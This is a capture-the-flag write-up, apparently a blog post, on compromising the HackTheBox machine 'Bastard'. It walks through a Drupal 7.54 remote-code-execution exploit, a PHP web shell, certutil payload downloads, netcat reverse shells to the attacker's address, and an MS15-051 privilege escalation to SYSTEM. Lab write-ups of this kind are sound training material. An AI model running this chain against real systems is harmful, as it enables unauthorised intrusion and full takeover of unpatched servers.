---
layout: post
title: HTB Bastard Writeup  
subtitle: Medium Box
thumbnail-img: /assets/img/bastard.png
tags: [HTB]
---
![Bastard](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/bastard/bastard.png)

| Name | Bastard |
| :------ |:--- |
| OS | Windows |
| RELEASE DATE | 18 Mar 2017 |
| DIFFICULTY | Medium |

# Port Scan

```bash
# Nmap 7.92 scan initiated Fri Apr 29 19:20:38 2022 as: nmap -p- -oN scriptScan.nmap -v -sVC 10.10.10.9
Nmap scan report for 10.10.10.9
Host is up (0.078s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03
|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
|_http-generator: Drupal 7 (http://drupal.org)
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

# HTTP 80

Going to the webpage it looks like it is a drupal site

![Bastard](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/bastard/611ccedf9d7c4c019877c578c5fb5e04.png)

From the nmap output, there was a `/robots.txt` page. Taking a look at that file there was a disallow entry for `/CHANGELOG.txt` this probably has version information about the drupal site. 

The changelog indeed does show the version to be "Drupal 7.54, 2017-02-01"

![Bastard](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/bastard/eb19e84b6a0e455ba3e55495b50b26c7.png)

Googling "Drupal 7.54" exploit brings me to [this](https://vk9-sec.com/drupal-7-x-module-services-remote-code-execution/) site explaining that there is an RCE 

It tells us to copy over the exploit using `searchsploit -m php/webapps/41564.php` and make a few changes to the first part of the exploit

```php
error_reporting(E_ALL);

define('QID', 'anything');
define('TYPE_PHP', 'application/vnd.php.serialized');
define('TYPE_JSON', 'application/json');
define('CONTROLLER', 'user');
define('ACTION', 'login');

$url = 'http://10.10.14.9/';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

$file = [
    'filename' => 'test.php',
    'data' => '<?php echo"Zonifer Rocks"; ?>'
];
```

Before we run the exploit we need to install `php-curl` by running `sudo apt-get install php-curl`. Once that is installed we can run the exploit `php 41564.php`, and now by going to `http://10.10.10.9/test.php` we can see that the exploit works!

![Bastard](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/bastard/73ecd3e92c7044c79af9d18e7098315b.png)

We can take this a step further and run commands on the server by making a few changes to our exploit 

```php
$url = 'http://10.10.10.9/';               
$endpoint_path = '/rest';                  
$endpoint = 'rest_endpoint';               

$phpCode = <<<'EOD'                        

<?php                                      


 if (isset($_REQUEST['fupload'])) {                                                   
   file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.14.12:8888/" . $_REQUEST['fupload']));                                                            
};                                         


 if (isset($_REQUEST['fexec'])) {
    echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
};

?>

EOD;

$file = [
    'filename' => 'cmd.php',
    'data' => $phpCode
];

```

Now going to `http://10.10.10.9/cmd.php?fexec=dir` gives us code execution!

![Bastard](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/bastard/96a459ec663b47aab42139ef2bb20880.png)

We can now use a netcat windows executable and get a reverse shell. First, we can locate the binary using `locate`, any one of these should work. I used [this one](https://eternallybored.org/misc/netcat/)

```zsh
┌──(kali㉿kali)-[~/htb/bastard]
└─$ locate nc.exe
/home/kali/tools/netcat-1.11/nc.exe
/opt/SecLists/Web-Shells/FuzzDB/nc.exe
/usr/share/windows-resources/binaries/nc.exe
```

We will copy it to our working directory `cp /home/kali/tools/netcat-1.11/nc.exe`, and start a python web server to host it `python3 -m http.server 80`. Next, we will use `certutil.exe` and our simple web shell to download the file from kali onto the host. `http://10.10.10.9/cmd.php?fexec=certutil.exe%20-urlcache%20-f%20http://10.10.14.3/nc.exe%20nc.exe`. We can see that it downloaded by looking at our python webserver

```zsh
┌──(kali㉿kali)-[~/htb/bastard]
└─$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.9 - - [29/Apr/2022 23:29:21] "GET /nc.exe HTTP/1.1" 200 -
10.10.10.9 - - [29/Apr/2022 23:29:22] "GET /nc.exe HTTP/1.1" 200 -
```

Next, start up a listener for the shell `nc -lvnp 9001` and execute this in the browser to get a connect back `http://10.10.10.9/cmd.php?fexec=nc.exe%2010.10.14.3%209001%20-e%20cmd.exe`. If we look back at our listener we can see that we now have a shell as `iusr`

```zsh
┌──(kali㉿kali)-[~/htb/bastard]
└─$rlwrap nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.9] 64544
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\drupal-7.54>whoami
whoami
nt authority\iusr
```

# Root

Let's see what kind of windows machine this is by running `systeminfo`. From the snip below it is a windows server 2008 R2 server on a 64-bit architecture.

```
Host Name:                 BASTARD
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-402-3582622-84461
Original Install Date:     18/3/2017, 7:04:46 
System Boot Time:          1/5/2022, 1:30:52 
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
```

There is a good GitHub repo called [SecWiki](https://github.com/SecWiki/windows-kernel-exploits) that has a directory for windows kernel exploits. Looking through the page [MS15-051](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051) looks like it might work on this machine. I will download the zip file and extract `ms15-051x64.exe` to my working directory. 

Next, we need to copy it over to the machine `certutil.exe -urlcache -f http://10.10.14.3/ms15-051x64.exe exploit.exe` (while still having our python web server running). 

And now we can test and see if it works

```
C:\inetpub\drupal-7.54>exploit.exe
[#] ms15-051 fixed by zcgonvh
[!] process with pid: 2492 created.
==============================
nt authority\system
```

We can now execute code as nt authority\system! We can use netcat again to get a reverse shell, but this time as system. Make sure to set up a netcat listener to catch the shell `nc -lvnp 9002` and now we can execute `exploit.exe "nc.exe 10.10.14.3 9002 -e cmd.exe"`

Once it is finished we have a shell as system!
```
C:\inetpub\drupal-7.54>whoami
whoami
nt authority\system
```
